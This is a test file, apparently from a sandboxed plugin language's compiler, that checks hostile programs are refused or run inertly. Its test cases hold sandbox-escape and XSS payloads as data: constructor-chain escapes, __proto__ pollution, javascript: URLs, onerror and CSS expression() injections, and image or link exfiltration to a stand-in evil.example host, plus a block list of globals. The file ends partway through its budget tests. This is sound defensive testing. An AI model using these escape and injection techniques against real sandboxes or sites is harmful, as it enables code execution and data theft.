// Hostile programs. Each must fail to compile with a clear error, or compile and be inert when it runs. "Inert"
// means: no global was written, nothing reached the host that is not plain data, and whatever was attempted threw.

import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { compile, verifyOutput } from "../src/index.js";
import type { CompileOptions } from "../src/contract.js";
import { testOptions } from "./fixtures/env.js";
import { compileOrThrow, fakeApp } from "./helpers/host.js";

const G = globalThis as Record<string, unknown>;

const PRE = `import { useState, useMemo, useEffect, css } from "thixo";
import { useQuery } from "@app/hooks";
import { leak } from "@app/probe";
import { listTodos } from "@app/sdk";
type Loose = { (...a: unknown[]): Loose; [k: string]: Loose };
function isLoose(x: unknown): x is Loose { return true; }
function L(x: unknown): Loose { if (isLoose(x)) { return x; } throw new Error("unreachable"); }
function K(a: string, b: string): string { return a + b; }
`;

function plugin(body: string, top = ""): string {
  return `${PRE}${top}\nexport default function X() {\n${body}\nreturn null;\n}\n`;
}

function element(jsx: string, top = ""): string {
  return `${PRE}${top}\nexport default function X() {\nreturn (${jsx});\n}\n`;
}

function refused(src: string, code?: string, options: CompileOptions = testOptions()) {
  const r = compile({ "main.thx": src }, options);
  assert.equal(r.ok, false, "expected the compiler to refuse this program");
  if (r.ok) return;
  for (const e of r.errors) {
    assert.match(e.code, /^thixo\//);
    assert.ok(e.message.length > 15, `message too short: ${e.message}`);
    assert.ok(e.line >= 1, `no line for ${e.code}: ${e.message}`);
    assert.equal(e.file, "main.thx");
  }
  if (code) assert.ok(r.errors.some((e) => e.code === code), `expected ${code}, got ${r.errors.map((e) => `${e.code}: ${e.message}`).join("; ")}`);
}

const DANGEROUS = new Set<unknown>([
  globalThis,
  Function,
  Object,
  Object.prototype,
  Array.prototype,
  Function.prototype,
  String.prototype,
  Promise,
  Reflect,
  Proxy,
  eval,
  setTimeout,
  process,
]);

function assertPlain(v: unknown, depth = 0): void {
  if (depth > 4 || v === null || typeof v !== "object" && typeof v !== "function") return;
  assert.ok(!DANGEROUS.has(v), "a host object reached the outside");
  if (typeof v === "function") assert.doesNotMatch(Function.prototype.toString.call(v), /\[native code\]/, "a native function reached the outside");
  if (typeof v === "object") for (const k of Object.keys(v)) assertPlain((v as Record<string, unknown>)[k], depth + 1);
}

async function inert(src: string, opts: { budget?: number; renders?: number; people?: { id: string; name: string; avatar: string }[] } = {}) {
  delete G.__pwned;
  const r = compile({ "main.thx": src }, testOptions());
  if (!r.ok) throw new Error(`expected this to compile, to test the runtime:\n${r.errors.map((e) => `${e.line}:${e.column} ${e.code} ${e.message}`).join("\n")}`);
  const app = await fakeApp(r.code, opts);
  let threw: unknown;
  try {
    app.render();
    for (let i = 1; i < (opts.renders ?? 1); i++) {
      await app.flush();
      app.render();
    }
  } catch (e) {
    threw = e;
  }
  await app.flush();
  assert.equal(G.__pwned, undefined, "the program wrote a global");
  app.leaked.forEach((v) => assertPlain(v));
  return { threw, app };
}

/** Either the compiler refuses it with a clear error, or it runs and the attempt throws with nothing getting out. */
async function blocked(src: string) {
  const r = compile({ "main.thx": src }, testOptions());
  if (!r.ok) return refused(src);
  await throwsInert(src);
}

/** Compiles and runs: the attempt must throw, and nothing may get out. */
async function throwsInert(src: string, message?: RegExp) {
  const { threw, app } = await inert(src);
  assert.ok(threw instanceof Error, "expected the attempt to throw");
  if (message) assert.match((threw as Error).message, message);
  return app;
}

process.on("unhandledRejection", (e) => {
  if ((e as Error)?.name !== "ThxStop") throw e;
});

describe("globals don't exist", () => {
  const names = [
    "window", "document", "globalThis", "self", "fetch", "XMLHttpRequest", "WebSocket", "setTimeout", "setInterval",
    "localStorage", "sessionStorage", "indexedDB", "eval", "Function", "require", "process", "Reflect", "Proxy",
    "Symbol", "console", "navigator", "location", "top", "parent", "frames", "opener", "queueMicrotask",
    "structuredClone", "Intl", "WebAssembly", "Worker", "Image", "postMessage", "crypto", "Buffer", "global",
    "module", "exports", "RegExp", "Atomics", "SharedArrayBuffer", "Uint8Array", "ArrayBuffer", "WeakMap", "BigInt",
  ];
  for (const name of names) test(name, () => refused(plugin(`const x = ${name}; leak(x);`), "thixo/no-global"));
  test("a global read inside a type position is still refused as a value", () => refused(plugin("type W = typeof window; const w: W = window;"), "thixo/no-global"));
});

describe("code from strings and dynamic imports", () => {
  test("import()", () => refused(plugin(`const m = import("@app/ui");`), "thixo/no-dynamic-import"));
  test("new Function", () => refused(plugin(`const f = new Function("globalThis.__pwned = 1");`), "thixo/no-new"));
  test("import of an outside module", () => refused(`import { useState } from "react";\n${plugin("")}`, "thixo/unknown-import"));
  test("import of node built-ins", () => refused(`import { readFileSync } from "node:fs";\n${plugin("")}`, "thixo/unknown-import"));
  test("import from a path outside the program", () => refused(`import { x } from "../../etc/passwd";\n${plugin("")}`, "thixo/missing-file"));
  test("default and namespace imports", () => refused(`import * as ui from "@app/ui";\n${plugin("")}`, "thixo/import"));
  test("require", () => refused(plugin(`const fs = require("fs");`), "thixo/no-global"));
});

describe("constructor chains, refused at build", () => {
  test("(() => {}).constructor", () => refused(plugin(`const F = (() => {}).constructor;`), "thixo/forbidden-field"));
  test("[].constructor.constructor", () => refused(plugin(`const F = [].constructor.constructor;`), "thixo/forbidden-field"));
  test('"".constructor', () => refused(plugin(`const S = "".constructor;`), "thixo/forbidden-field"));
  test("async function constructor", () => refused(plugin(`const A = (async () => {}).constructor;`), "thixo/forbidden-field"));
  test("__proto__ by dot", () => refused(plugin(`const p = ({ a: 1 }).__proto__;`), "thixo/forbidden-field"));
  test("prototype by dot", () => refused(plugin(`const p = Array.prototype;`), "thixo/forbidden-field"));
  test("constructor by literal computed key", () => refused(plugin(`const F = L(() => 0)["constructor"];`), "thixo/forbidden-field"));
  test("constructor by template-literal key", () => refused(plugin("const F = L(() => 0)[`constructor`];"), "thixo/forbidden-field"));
  test("constructor by an escaped string key", () => refused(plugin(`const F = L(() => 0)["\\u0063onstructor"];`), "thixo/forbidden-field"));
  test("constructor through destructuring", () => refused(plugin(`const { constructor } = () => 0;`), "thixo/forbidden-field"));
  test("__proto__ as an object-literal key", () => refused(plugin(`const o = { __proto__: null };`), "thixo/forbidden-field"));
  test("constructor through optional chaining", () => refused(plugin(`const F = L(0)?.constructor;`), "thixo/forbidden-field"));
  test("arguments.callee", () => refused(`${PRE}\nfunction f() { return arguments.callee; }\n${plugin("")}`));
  test("unicode escape in an identifier", () => refused(plugin(`const \\u0061 = 1;`), "thixo/identifier"));
  test("unicode escape in a property name", () => refused(plugin(`const c = L(0).\\u0063onstructor;`), "thixo/identifier"));
});

describe("constructor chains at run time (the type check bypassed with a type predicate)", () => {
  test("a function's constructor by a built key throws", () => throwsInert(plugin(`L(() => 0)[K("constr", "uctor")]("globalThis.__pwned = 1")();`), /no fields/));
  test("an async function's constructor throws", () => throwsInert(plugin(`L(async () => 0)[K("constr", "uctor")]("globalThis.__pwned = 1")();`), /no fields/));
  test("a list's constructor is not there", () => throwsInert(plugin(`L([])[K("constr", "uctor")][K("constr", "uctor")]("globalThis.__pwned = 1")();`)));
  test("a string's constructor is not there", async () => {
    const { app } = await inert(plugin(`leak(L("x")[K("constr", "uctor")] === undefined);`));
    assert.deepEqual(app.leaked, [true]);
  });
  test("a record has nothing behind it", async () => {
    const { app } = await inert(plugin(`const o = L({ a: 1 }); leak([o[K("constr", "uctor")] === undefined, o[K("__pro", "to__")] === undefined, o[K("toStr", "ing")] === undefined, o[K("hasOwn", "Property")] === undefined]);`));
    assert.deepEqual(app.leaked, [[true, true, true, true]]);
  });
  test("a built-in namespace has no prototype", async () => {
    const { app } = await inert(plugin(`leak([L(Array)[K("proto", "type")] === undefined, L(Math)[K("constr", "uctor")] === undefined, L(Date)[K("proto", "type")] === undefined]);`));
    assert.deepEqual(app.leaked, [[true, true, true]]);
  });
  test("a list method read as a value is a language function with no fields", () => throwsInert(plugin(`L([].map)[K("ca", "ll")];`), /no fields/));
  test("destructuring a function's constructor throws", () => throwsInert(plugin(`const { [K("constr", "uctor")]: F } = L(() => 0); F("globalThis.__pwned = 1")();`)));
  test("spreading a function copies nothing", async () => {
    const { app } = await inert(plugin(`const o = { ...L(() => 0) }; leak(Object.keys(o).length);`));
    assert.deepEqual(app.leaked, [0]);
  });
  test("optional chaining to a constructor throws", () => throwsInert(plugin(`L(() => 0)?.[K("constr", "uctor")]?.("globalThis.__pwned = 1")?.();`)));
  test("a computed __proto__ key in a literal throws", () => throwsInert(plugin(`const o = { [K("__pro", "to__")]: { polluted: 1 } }; leak(o);`), /__proto__/));
  test("JSON.parse output has no prototype and no __proto__", async () => {
    const { app } = await inert(plugin(`const o = L(JSON.parse('{"__proto__": {"polluted": 1}, "a": {"constructor": 1}}')); leak([o[K("__pro", "to__")] === undefined, o.a.constructor === undefined]);`.replace("o.a.constructor", `o["a"][K("constr", "uctor")]`)));
    assert.deepEqual(app.leaked, [[true, false]]);
    assert.equal(({} as Record<string, unknown>).polluted, undefined);
  });
  test("a promise has only then, catch and finally", async () => {
    const { app } = await inert(plugin(`leak([L(Promise.resolve(1))[K("constr", "uctor")] === undefined, L(Promise)[K("constr", "uctor")] === undefined]);`));
    assert.deepEqual(app.leaked, [[true, true]]);
  });
  test("a Date has no setters and no constructor", async () => {
    const { app } = await inert(plugin(`const d = L(new Date(0)); leak([d[K("setFull", "Year")] === undefined, d[K("constr", "uctor")] === undefined]);`));
    assert.deepEqual(app.leaked, [[true, true]]);
  });
  test("a Map's keys are a list, not an iterator", async () => {
    const { app } = await inert(plugin(`const it = L(new Map([["a", 1]]).keys()); leak([it[K("ne", "xt")] === undefined, it[K("constr", "uctor")] === undefined]);`));
    assert.deepEqual(app.leaked, [[true, true]]);
  });
  test("Symbol.iterator can't be reached through a value", () => refused(plugin(`const it = [][Symbol.iterator];`), "thixo/no-global"));
});

describe("host objects through values the host hands in", () => {
  test("a React element has no fields", () => throwsInert(plugin(`const e = <div />; L(e)[K("_ow", "ner")];`), /no fields/));
  test("an element's props are not readable", () => throwsInert(plugin(`const e = <div title="x" />; L(e).props;`), /no fields/));
  test("a hook's setter has no fields", () => throwsInert(plugin(`const [, set] = useState(0); L(set)[K("constr", "uctor")]("globalThis.__pwned = 1")();`), /no fields/));
  test("a hook's result is a frozen copy with nothing behind it", async () => {
    const { app } = await inert(plugin(`const q = L(useQuery(listTodos)); leak([q[K("constr", "uctor")] === undefined, q[K("__pro", "to__")] === undefined]);`));
    assert.deepEqual(app.leaked, [[true, true]]);
  });
  test("an SDK function has no fields", () => throwsInert(plugin(`L(listTodos)[K("constr", "uctor")];`), /no fields/));
  test("a thrown error is a record with a name and a message only", async () => {
    const { app } = await inert(plugin(`try { L(null)[K("a", "b")]; } catch (e) { const r = L(e); leak([typeof r.message, r[K("st", "ack")] === undefined, r[K("constr", "uctor")] === undefined]); }`));
    assert.deepEqual(app.leaked, [["string", true, true]]);
  });
  test("a host error thrown from the SDK arrives as a record", async () => {
    const src = `${PRE}import { deleteTodo } from "@app/sdk";\nexport default function X() {\nconst go = async () => { try { await deleteTodo({ id: "1" }); } catch (e) { const r = L(e); leak([r.message, r[K("st", "ack")] === undefined, r[K("constr", "uctor")] === undefined]); } };\ngo();\nreturn null;\n}\n`;
    const { app } = await inert(src);
    assert.deepEqual(app.leaked, [["refused: deleteTodo", true, true]]);
  });
  test("context handed in can't be changed", () => throwsInert(plugin(`const c = L(useQuery(listTodos)); c[K("lo", "ading")] = L(false);`), /can't be changed/));
  test("a list handed in can't be pushed to", async () => {
    const src = `${PRE}\nexport default function X() {\nconst q = useQuery(listTodos);\nif (q.data) { const list = q.data; list.push({ id: "x", title: "y", done: false }); }\nreturn null;\n}\n`;
    const { threw } = await inert(src, { renders: 2 });
    assert.match(String((threw as Error)?.message), /can't be changed/);
  });
  test("a value passed to the host freezes", () => throwsInert(plugin(`const o = { a: 1 }; leak(o); o.a = 2;`), /can't be changed/));
  test("this, arguments, new.target and super are refused", () => {
    refused(plugin(`const t = this;`), "thixo/not-in-language");
    refused(`${PRE}\nfunction f() { return arguments; }\n${plugin("")}`);
    refused(`${PRE}\nfunction f() { return new.target; }\n${plugin("")}`, "thixo/not-in-language");
    refused(plugin(`const s = super.x;`));
  });
  test("a thenable record is awaited as a value and never called", async () => {
    const { app } = await inert(plugin(`const t: unknown = { then: (r: unknown) => leak(L(r)) }; const go = async () => { const v = await t; leak(typeof v); }; go();`));
    assert.deepEqual(app.leaked, ["object"]);
  });
});

describe("syntax that is not in the language", () => {
  const cases: [string, string, string?][] = [
    ["class", "class A {}", "thixo/not-in-language"],
    ["tagged template", "const s = String`x`;", "thixo/not-in-language"],
    ["getter", "const o = { get x() { return 1; } };", "thixo/not-in-language"],
    ["setter", "const o = { set x(v: number) {} };", "thixo/not-in-language"],
    ["with", "with ({}) {}"],
    ["label", "a: for (const x of [1]) { break a; }", "thixo/not-in-language"],
    ["comma", "const x = (1, 2);", "thixo/operator"],
    ["comma call trick", "const f = (0, [].map);", "thixo/operator"],
    ["delete", "const o = { a: 1 }; delete o.a;", "thixo/not-in-language"],
    ["void", "const x = void 0;", "thixo/not-in-language"],
    ["var", "var x = 1;", "thixo/not-in-language"],
    ["==", "const x = 1 == 1;", "thixo/operator"],
    ["in", 'const x = "a" in {};', "thixo/operator"],
    ["instanceof", "const x = [] instanceof Array;", "thixo/operator"],
    ["for in", "for (const k in {}) {}", "thixo/not-in-language"],
    ["generator", "function* g() { yield 1; }", "thixo/not-in-language"],
    ["regular expression", "const r = /a+/;", "thixo/not-in-language"],
    ["any", "const x: any = 1;", "thixo/no-any"],
    ["as", "const x = 1 as number;", "thixo/no-as"],
    ["angle assertion", "const x = <number>1;"],
    ["non-null", "const x = [1].find((n) => n)!;", "thixo/no-non-null"],
    ["ts-ignore", "// @ts-ignore\nconst x: number = 'a';", "thixo/ts-directive"],
    ["enum", "enum E { A }", "thixo/not-in-language"],
    ["finally that swallows a stop", "try { } finally { return null; }", "thixo/not-in-language"],
    ["new on a user function", "function F() {} const f = new F();", "thixo/no-new"],
    ["destructuring assignment", "let a = 1; let b = 2; [a, b] = [b, a];", "thixo/not-in-language"],
    ["debugger", "debugger;", "thixo/not-in-language"],
    ["bigint", "const n = 1n;", "thixo/not-in-language"],
  ];
  for (const [name, body, code] of cases) test(name, () => refused(plugin(body), code));
  test("top-level code", () => refused(`${PRE}leak(1);\n${plugin("")}`, "thixo/top-level"));
  test("top-level let", () => refused(`${PRE}let count = 0;\n${plugin("")}`, "thixo/top-level"));
  test("@ts-nocheck", () => refused(`// @ts-nocheck\n${plugin("")}`, "thixo/ts-directive"));
  test("a file with no imports can't augment the lib's globals", () => {
    const r = compile({ "main.thx": plugin(`const s: string = "x"; const u: Url = s.toUrl();`), "augment.thx": "interface String { toUrl(): Url; }\n" }, testOptions());
    assert.equal(r.ok, false);
  });
  test("declare can't invent a global", () => refused(plugin("", "declare const window: { fetch(): void };\n"), "thixo/not-in-language"));
  test("declare global can't invent a global", () => refused(plugin("", "declare global { const leakTo: (x: unknown) => void; }\n")));
});

describe("names the compiler uses can't be reached", () => {
  test("shadowing rt and the compiler's own names does not touch the runtime", async () => {
    const { app, threw } = await inert(plugin(`const rt = { g: () => "mine" }; const t0 = 1; const t1 = 2; const u0_leak = 3; const l_x = 4; leak([rt.g(), t0, t1, u0_leak, l_x]);`));
    assert.equal(threw, undefined);
    assert.deepEqual(app.leaked, [["mine", 1, 2, 3, 4]]);
  });
  test("a parameter named like a temp does not capture the compiler's temp", async () => {
    const { app } = await inert(plugin(`const f = (t2: number, t3: number) => t2 + t3; leak(f(1, 2));`));
    assert.deepEqual(app.leaked, [3]);
  });
  test("eval and arguments can't be declared", () => {
    refused(plugin(`const eval = 1;`));
    refused(plugin(`const arguments = 1;`));
  });
});

describe("coercion and mutation", () => {
  test("toString and valueOf coercion runs only plugin code", async () => {
    const { app } = await inert(plugin(`const o = { toString: () => "t", valueOf: () => 2 }; leak(["" + L(o), \`\${L(o)}\`]);`));
    app.leaked.forEach((v) => assertPlain(v));
  });
  test("a Url can't be turned into text", async () => {
    const src = `${PRE}import { listPeople } from "@app/sdk";\nexport default function X() {\nconst p = useQuery(listPeople);\nif (p.data) { leak(\`\${p.data[0].avatar}\`); }\nreturn null;\n}\n`;
    const { threw, app } = await inert(src, { renders: 2 });
    assert.match(String((threw as Error)?.message), /Url can't be turned into text/);
    assert.deepEqual(app.leaked, []);
  });
  test("built-in prototypes can't be changed", () => throwsInert(plugin(`L([])[K("__pro", "to__")][K("ma", "p")] = L(() => 1);`)));
  test("a list can't be grown into a sparse giant", () => throwsInert(plugin(`const a: number[] = []; a[1000000] = 1;`), /indexes/));
  test("a list's length can't be set", () => throwsInert(plugin(`const a: number[] = [1]; L(a).length = L(0);`), /indexes/));
  test("repeat can't build a huge string", () => throwsInert(plugin(`const s = "x".repeat(100000000);`), /more than the language allows/));
});

describe("handed-in addresses that load", () => {
  // redteam-language round 2 found that a `Url` from data (an avatar field) rendered as <img src> is a request to any
  // host. The owner accepts that: the plugin did not make the address, the app's data did. What a plugin can't do is
  // build one or write one out that loads from outside (L7).
  const people = `${PRE}import { listPeople } from "@app/sdk";\n`;
  const show = (jsx: string) => `${people}export default function X() {\nconst t = useQuery(listTodos);\nconst p = useQuery(listPeople);\nif (t.data && p.data && p.data.length > 1) { const a = p.data[0].avatar; const b = p.data[1].avatar; const bit = t.data[1].done; return (${jsx}); }\nreturn null;\n}\n`;
  const others = [{ id: "p2", name: "Ben", avatar: "https://elsewhere.example/ben.png" }];

  test("a handed-in Url on any host is an image", async () => {
    const { threw, app } = await inert(show(`<img src={b} alt="" />`), { renders: 2, people: others });
    assert.equal(threw, undefined);
    const [img] = app.render() as { props: Record<string, unknown> }[];
    assert.equal(img.props.src, "https://elsewhere.example/ben.png");
  });
  test("a handed-in Url is a style's url(), in the style prop and in css()", async () => {
    const viaStyle = await inert(show(`<div style={{ backgroundImage: b }} />`), { renders: 2, people: others });
    assert.equal(viaStyle.threw, undefined);
    const viaCss = await inert(show(`<div className={css({ backgroundImage: b })} />`), { renders: 2, people: others });
    assert.equal(viaCss.threw, undefined);
    assert.ok([...viaCss.app.styles.values()].some((r) => r.includes('url("https://elsewhere.example/ben.png")')));
  });
  test("a handed-in Url still works as a link", async () => {
    const { threw, app } = await inert(show(`<a href={b}>Ben</a>`), { renders: 2, people: others });
    assert.equal(threw, undefined);
    const [link] = app.render() as { props: Record<string, unknown> }[];
    assert.equal(link.props.href, "https://elsewhere.example/ben.png");
  });
  test("the host can't hand a program an address that runs code", async () => {
    for (const bad of ["javascript:alert(1)", "JaVaScRiPt:alert(1)", " javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "vbscript:x", "//evil.example/x.png"]) {
      const app = await fakeApp(compileOrThrow({ "main.thx": element("<p>x</p>") }).code);
      assert.throws(() => app.rt.url(bad), /is not an address a program may be handed/, bad);
    }
  });
});

describe("outside addresses written in the source", () => {
  // A program loads nothing from outside the page by what its source writes: a load would tell that server the
  // program ran, and a choice between several loads would carry data.
  test("an outside image is a compile error", () => refused(element(`<img src="https://cdn.example.com/logo.png" alt="" />`), "thixo/address"));
  test("an http image is a compile error", () => refused(element(`<img src="http://cdn.example.com/logo.png" alt="" />`), "thixo/address"));
  test("a path on the page's own origin is a compile error", () => refused(element(`<img src="/secret.png" alt="" />`), "thixo/address"));
  test("a protocol-relative image is a compile error", () => refused(element(`<img src="//evil.example/x.png" alt="" />`), "thixo/address"));
  test("an outside address in a style's url() is refused", () => blocked(plugin(`const e = <div style={{ backgroundImage: "url(https://evil.example/x.png)" }} />; const c = css({ backgroundImage: "url(https://evil.example/y.png)" }); leak([e, c]);`)));
  test("choosing among written-out images by a secret doesn't compile", () => {
    const src = `${PRE}export default function X() {
  const q = useQuery(listTodos);
  const secret = q.data && q.data[1] ? q.data[1].done : false;
  return secret ? <img src="https://evil.example/bit1.png" alt="" /> : <img src="https://evil.example/bit0.png" alt="" />;
}
`;
    refused(src, "thixo/address");
  });
  test("a written-out outside load is refused at run time, without the compiler's check", async () => {
    const r = compileOrThrow({ "main.thx": element(`<img src="data:image/png;base64,iVBORw0KGgo=" alt="" />`) });
    for (const bad of ["https://evil.example/x.png", "/secret.png", "//evil.example/x.png"]) {
      const app = await fakeApp(r.code.replace("data:image/png;base64,iVBORw0KGgo=", bad));
      assert.throws(() => app.render(), /can't load|not allowed/, bad);
    }
  });
  test("a data: image compiles, renders, and lists no address", async () => {
    const r = compileOrThrow({ "main.thx": element(`<img src="data:image/png;base64,iVBORw0KGgo=" alt="" />`) });
    assert.deepEqual(r.links, []);
    const app = await fakeApp(r.code);
    const [img] = app.render() as { props: Record<string, unknown> }[];
    assert.equal(img.props.src, "data:image/png;base64,iVBORw0KGgo=");
  });
});

describe("elements", () => {
  const cases: [string, string, string?][] = [
    ["script", `<script>{"alert(1)"}</script>`, "thixo/element"],
    ["iframe", `<iframe />`, "thixo/element"],
    ["object", `<object />`, "thixo/element"],
    ["embed", `<embed />`, "thixo/element"],
    ["link", `<link rel="prerender" href="https://evil.example" />`, "thixo/element"],
    ["meta", `<meta httpEquiv="refresh" content="0;url=https://evil.example" />`, "thixo/element"],
    ["base", `<base href="https://evil.example/" />`, "thixo/element"],
    ["style element", `<style>{"body { display: none }"}</style>`, "thixo/element"],
    ["form action", `<form action="https://evil.example"></form>`, "thixo/attribute"],
    ["javascript: link", `<a href="javascript:alert(1)">x</a>`, "thixo/address"],
    ["data: html image", `<img src="data:text/html,<script>alert(1)</script>" />`, "thixo/address"],
    ["srcdoc", `<div srcDoc="<script>alert(1)</script>" />`, "thixo/attribute"],
    ["onclick string", `<div onclick="alert(1)" />`, "thixo/attribute"],
    ["onClick string", `<div onClick="alert(1)" />`, "thixo/attribute"],
    ["dangerouslySetInnerHTML", `<div dangerouslySetInnerHTML={{ __html: "<img src=x onerror=alert(1)>" }} />`, "thixo/attribute"],
    ["ref", `<div ref={() => {}} />`, "thixo/attribute"],
    ["id clobbering", `<img id="config" />`, "thixo/attribute"],
    ["svg use", `<svg><use href="#x" /></svg>`, "thixo/element"],
    ["svg foreignObject", `<svg><foreignObject /></svg>`, "thixo/element"],
    ["svg animate", `<svg><animate attributeName="href" to="javascript:alert(1)" /></svg>`, "thixo/element"],
    ["svg set", `<svg><set attributeName="href" to="javascript:alert(1)" /></svg>`, "thixo/element"],
    ["svg image", `<svg><image href="https://evil.example/x.png" /></svg>`, "thixo/element"],
    ["xlinkHref", `<svg><path xlinkHref="https://evil.example" /></svg>`, "thixo/attribute"],
    ["xlink:href", `<svg><path xlink:href="https://evil.example" /></svg>`, "thixo/attribute"],
    ["a built address", "<a href={`https://evil.example/?q=${listTodos.length}`}>x</a>", "thixo/address"],
    ["a concatenated address", `<a href={"https://evil.example/?q=" + "x"}>x</a>`, "thixo/address"],
    ["popover", `<div popover="auto" />`, "thixo/attribute"],
    ["target", `<a href="https://example.com" target="_self">x</a>`, "thixo/attribute"],
    ["link credentials", `<a href="https://user:pw@example.com">x</a>`, "thixo/address"],
    ["http link", `<a href="http://evil.example/">x</a>`, "thixo/address"],
    ["mailto written out", `<a href="mailto:a@example.com">x</a>`, "thixo/address"],
  ];
  for (const [name, jsx, code] of cases) test(name, () => refused(element(jsx), code));

  test("a link written out to any https host opens in a new tab with noopener noreferrer, and is listed", async () => {
    const r = compile({ "main.thx": element(`<a href="https://docs.example.com/help">Help</a>`) }, testOptions());
    assert.ok(r.ok);
    if (!r.ok) return;
    assert.deepEqual(r.links, ["https://docs.example.com/help"]);
    const app = await fakeApp(r.code);
    const [a] = app.render() as { type: string; props: Record<string, unknown> }[];
    assert.deepEqual([a.type, a.props.href, a.props.target, a.props.rel], ["a", "https://docs.example.com/help", "_blank", "noopener noreferrer"]);
  });
  test("a link chosen by secret data among fixed outside addresses compiles, and the result lists every one", () => {
    // redteam-exfil round 1: one anchor over N fixed literals on the attacker's host tells it log2(N) bits a click.
    // Accepted for links, which wait for a click; the compile result lists every link so a host can show them.
    const src = `${PRE}export default function X() {
  const q = useQuery(listTodos);
  const secret = q.data && q.data[0] ? q.data[0].done : false;
  return secret ? <a href="https://evil.example/bit1">o</a> : <a href="https://evil.example/bit0">o</a>;
}
`;
    const r = compile({ "main.thx": src }, testOptions());
    assert.ok(r.ok);
    if (r.ok) assert.deepEqual(r.links, ["https://evil.example/bit0", "https://evil.example/bit1"]);
  });
  test("a written-out link is never http at run time, without the compiler's check", async () => {
    const r = compileOrThrow({ "main.thx": element(`<a href="https://docs.example.com/help">Help</a>`) });
    const app = await fakeApp(r.code.replace("https://docs.example.com/help", "http://docs.example.com/help"));
    assert.throws(() => app.render(), /not allowed here/);
  });
  test("a dynamic tag name can't make a script", () => blocked(plugin(`const T = L(K("scr", "ipt")); const e = <T />; leak(1);`), /not an element/));
  test("spread props can't add an event attribute", () => throwsInert(plugin(`const p = L({ [K("on", "click")]: "alert(1)" }); const e = <div {...p} />;`), /not an attribute/));
  test("spread props can't set href to a string", () => throwsInert(plugin(`const p = L({ href: "javascript:alert(1)" }); const e = <a {...p}>x</a>;`), /takes a Url/));
  test("a string passed off as a Url is refused", () =>
    throwsInert(`${PRE}function isUrl(x: unknown): x is Url { return true; }\nexport default function X() {\nconst s = "javascript:alert(1)";\nif (isUrl(s)) { return <a href={s}>x</a>; }\nreturn null;\n}\n`, /takes a Url/));
  test("a record shaped like a Url is refused", () =>
    throwsInert(plugin(`const u: unknown = { address: "https://evil.example" }; if (isUrl(u)) { const e = <img src={u} />; }`, "function isUrl(x: unknown): x is Url { return true; }\n"), /takes a Url/));
  test("JSON.parse can't make a Url", () =>
    throwsInert(plugin(`const u = JSON.parse('{"__thxUrl": 1}'); if (isUrl(u)) { const e = <img src={u} />; }`, "function isUrl(x: unknown): x is Url { return true; }\n"), /takes a Url/));
  test("a Url can't be built by any string route", () => refused(plugin(`const u: Url = "https://evil.example";`), "thixo/type"));
  test("a handler gets plain data, not the event", async () => {
    const r = compile({ "main.thx": element(`<input onChange={(e) => leak(e)} />`) }, testOptions());
    assert.ok(r.ok);
    if (!r.ok) return;
    const app = await fakeApp(r.code);
    const [input] = app.render() as { props: Record<string, unknown> }[];
    const target = { value: "typed", checked: false, ownerDocument: globalThis };
    (input.props.onChange as (e: unknown) => void)({ target, nativeEvent: { offsetX: 3, offsetY: 4 }, view: globalThis });
    assert.deepEqual(app.leaked, [{ value: "typed", checked: false, key: "", x: 3, y: 4 }]);
    assert.equal(input.props.autoComplete, "off");
  });
  test("a form never submits anywhere", async () => {
    const r = compile({ "main.thx": element(`<form><button type="submit">Go</button></form>`) }, testOptions());
    assert.ok(r.ok);
    if (!r.ok) return;
    const app = await fakeApp(r.code);
    const [form] = app.render() as { props: Record<string, unknown> }[];
    let prevented = false;
    (form.props.onSubmit as (e: unknown) => void)({ preventDefault: () => (prevented = true) });
    assert.equal(prevented, true);
  });
});

describe("styles", () => {
  test("css() makes a scoped class with states and media", async () => {
    const r = compile({ "main.thx": plugin(`leak(css({ padding: 8, color: "red", ":hover": { color: "blue" }, "@media (min-width: 600px)": { padding: 16 } }));`) }, testOptions());
    assert.ok(r.ok);
    if (!r.ok) return;
    const app = await fakeApp(r.code);
    app.render();
    const cls = app.leaked[0] as string;
    assert.match(cls, /^thx\d+-[a-z0-9]+$/);
    const rules = app.styles.get(cls)!;
    assert.ok(rules.includes(`.${cls}{padding:8px;color:red}`), rules);
    assert.ok(rules.includes(`.${cls}:hover{color:blue}`), rules);
    assert.ok(rules.includes(`@media (min-width: 600px){.${cls}{padding:16px}}`), rules);
    assert.equal(app.rt.styleSheet(), rules);
    for (const line of rules.split("\n")) assert.ok(line.startsWith(`.${cls}`) || line.startsWith("@media"), `a rule that reaches out: ${line}`);
  });
  const bad: [string, string][] = [
    ["url() in a style", `css({ backgroundImage: "url(https://evil.example/x.png)" })`],
    ["expression()", `css({ width: "expression(alert(1))" })`],
    ["@import", `css({ ["@import url(https://evil.example/x.css)"]: { color: "red" } })`],
    ["breaking out of the rule", `css({ color: "red} body {display:none" })`],
    ["a selector that reaches out", `css({ ["& body"]: { display: "none" } })`],
    ["a state list that reaches out", `css({ [":hover, body"]: { display: "none" } })`],
    ["position fixed", `css({ position: "fixed" })`],
    ["an unknown property", `css({ [K("beh", "avior")]: "url(x.htc)" })`],
    ["an escape", `css({ color: "\\\\72 ed" })`],
    ["a comment", `css({ color: "red /* x" })`],
    ["an unclosed quote", `css({ fontFamily: "'Inter" })`],
    ["a style prop with url()", `<div style={{ background: "url(javascript:alert(1))" }} />`],
    ["a style prop with a state", `<div style={L({ ":hover": { color: "red" } })} />`],
    ["a string passed off as a Url in a style", `css({ backgroundImage: L("https://evil.example/x.png") })`],
  ];
  for (const [name, expr] of bad) test(name, () => blocked(plugin(`const x = ${expr}; leak(1);`)));
});

describe("budget", () => {
  const small = { budget: 20_000 };
  const stops = async (body: string, top = "") => {
    const { threw, app } = await inert(plugin(body, top), small);
    await app.flush();
    assert.equal(app.rt.stopped, true, "the runtime should be stopped");
    assert.ok(app.errors.some((e) => e.name === "ThxStop"), "the host should hear about it");
    assert.throws(() => app.render(), /stopped|ran more|deep|awaited/);
    return { threw, app };
  };
  test("while (true)", async () => {
    const { threw } = await stops("while (true) {}");
    assert.match(String((threw as Error).message), /ran more than 20000 steps/);
  });
  test("for (;;)", () => stops("for (;;) {}"));
  test("do while", () => stops("do {} while (true);"));
  test("a list that grows as it is walked", () => stops("const xs = [1]; for (const x of xs) { xs.push(x); }"));
  test("unbounded recursion", async () => {
    const { threw } = await stops("f();", "function f(): number { return f() + 1; }\n");
    assert.match(String((threw as Error).message), /deep/);
  });
  test("recursion through a built-in's callback", () => stops("f();", "function f(): number[] { return [1].map(() => f().length); }\n"));
  test("a catch can't swallow the stop", () => stops("while (true) { try { while (true) {} } catch (e) { leak(1); } }"));
